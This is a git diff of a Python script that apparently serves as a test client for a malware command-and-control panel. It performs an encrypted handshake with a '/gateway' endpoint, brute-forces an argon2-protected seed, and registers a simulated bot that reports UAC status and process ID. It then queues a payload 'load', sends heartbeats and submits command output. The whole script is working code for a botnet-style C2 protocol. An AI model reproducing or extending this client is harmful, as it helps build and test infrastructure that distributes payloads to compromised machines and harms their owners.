@@ -13,8 +13,19 @@ import hashlib
 import time
 import rsa
 
+import secrets
+import argon2
+import time
+from colorama import Fore
+import random
+import binascii
+from itertools import permutations
+
 SERVER_ADDRESS = "http://127.0.0.1:9999"
 API_SECRET = "debug"
+
+def charsex_bytes(bytearray_input):
+    return list(permutations(bytearray_input))
 
 def encrypt_data_withkey(plaintext, key):
     cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
@@ -34,11 +45,9 @@ def decrypt_data_withkey(base64_encoded_ciphertext, key):
     plaintext = unpadder.update(decrypted_ciphertext) + unpadder.finalize()
     return plaintext
 
-print("[?] Register Client")
 
 client_bytes = secrets.token_bytes(32)
-#with open('/home/admin/Documents/rust/Blight/public.pem', mode='rb') as f:
-#    keydata = f.read()
+test_payload_image = open("image.png", "rb").read()
 
 keydata = b'''
 -----BEGIN RSA PUBLIC KEY-----
@@ -51,7 +60,35 @@ xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
 -----END RSA PUBLIC KEY-----
 '''
 
-encrypted_message = encrypt_data_withkey(
+rsa_client_bytes = base64.b64encode(rsa.encrypt(client_bytes, rsa.PublicKey.load_pkcs1(keydata))).decode("utf-8")
+register_client = requests.post(
+    SERVER_ADDRESS + "/gateway", 
+    rsa_client_bytes
+)
+
+handshake_1_response = json.loads(decrypt_data_withkey(register_client.text, client_bytes).decode("utf-8"))
+
+start_time = time.time()
+server_bytes = None
+
+print("[?] Handshake P1")
+for chosen_bytes in charsex_bytes(base64.b64decode(handshake_1_response["seed"])):
+    client_hasher = argon2.PasswordHasher(time_cost=16, memory_cost=2**4, parallelism=2, hash_len=32, type=argon2.low_level.Type.ID)
+
+    try:
+        client_hasher.verify(handshake_1_response["server_hash"], bytes(chosen_bytes))
+        time_found = int(time.time() - start_time)
+        server_bytes = bytes(chosen_bytes)
+    except argon2.exceptions.VerifyMismatchError:
+        continue
+    break
+
+encryption_key = hashlib.sha256(client_bytes + server_bytes).hexdigest()[:32].encode()
+
+print(f"Encryption key found! ({time_found}s): ", encryption_key.decode())
+print(f"{handshake_1_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+
+registration_payload = base64.b64encode(rsa.encrypt(encryption_key, rsa.PublicKey.load_pkcs1(keydata))).decode() + "." + encrypt_data_withkey(
     json.dumps({
         "version": 10,
         "uac": False,
@@ -65,30 +102,25 @@ encrypted_message = encrypt_data_withkey(
         "pid": 5102,
         "client_bytes": base64.encodebytes(client_bytes).decode("utf-8"),
     }),
-    client_bytes
-) + "|" + base64.b64encode(rsa.encrypt(client_bytes, rsa.PublicKey.load_pkcs1(keydata))).decode("utf-8")
+    encryption_key
+)
 
 
-register_client = requests.post(
+registration_request = requests.post(
     SERVER_ADDRESS + "/gateway", 
-    encrypted_message
+    registration_payload
 )
 
-decrypted_response = json.loads(
-    decrypt_data_withkey(register_client.text, client_bytes).decode("utf-8")
-)
-server_bytes = base64.decodebytes(
-    decrypted_response["server_bytes"].encode()
-)
+time.sleep(91)
 
-new_encryption_key = hashlib.sha256(client_bytes + server_bytes).hexdigest()[:32].encode()
-client_id = decrypted_response["client_id"]
+try:
+    print("[?] Registration Request")
+    client_id = decrypt_data_withkey(registration_request.text, encryption_key).decode()
+    print(f"Client ID: {client_id}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+except:
+    print(registration_request.text)
+    quit()
 
-print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
-
-img = None
-with open("image.png", 'rb') as f:
-    img = f.read()
 
 print("[?] Issue Load")
 issue_load = requests.post(
@@ -98,37 +130,46 @@ issue_load = requests.post(
         "is_recursive": True,
         "cmd_type": "disk",
         "required_amount": 10,
-        "cmd_args": base64.b64encode(img).decode("utf-8")
+        "cmd_args": base64.b64encode(test_payload_image).decode("utf-8")
     }),
 )
 
-print(f"{issue_load.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+print(f"Load ID: {issue_load.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+
+
 
 print("[?] Heartbeat Client")
 heartbeat_response = requests.post(
     SERVER_ADDRESS + "/gateway", 
-    client_id + encrypt_data_withkey(json.dumps({
+    client_id + "." + encrypt_data_withkey(json.dumps({
         "action": "heartbeat",
-    }), new_encryption_key)
+    }), encryption_key)
 )
-
-decrypted_response = decrypt_data_withkey(heartbeat_response.text, new_encryption_key).decode("utf-8")
-print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+try:
+    decrypted_response = decrypt_data_withkey(heartbeat_response.text, encryption_key).decode("utf-8")
+    resp_json = json.loads(decrypted_response)
+    resp_json["cmd_args"] = resp_json["cmd_args"][:100] + "..."
+    print(f"{resp_json}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+except:
+    print(heartbeat_response.text)
 
 if decrypted_response != "Ok":
 
     print("[?] Submit Output")
     submit_output = requests.post(
         SERVER_ADDRESS + "/gateway", 
-        client_id + encrypt_data_withkey(json.dumps({
+        client_id + "." + encrypt_data_withkey(json.dumps({
             "action": "submit_output",
-            "client_id": client_id,
             "command_id": json.loads(decrypted_response)["command_id"],
             "output": "Completed Succesfully"
-        }), new_encryption_key)
+        }), encryption_key)
     )
-    decrypted_response = decrypt_data_withkey(submit_output.text, new_encryption_key).decode("utf-8")
-    print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+
+    try:
+        decrypted_response = decrypt_data_withkey(submit_output.text, encryption_key).decode("utf-8")
+        print(f"{decrypted_response}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+    except:
+        print(f"{submit_output.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
 
 # //-------------------------------------- Server Endpoints --------------------------------------\\
 
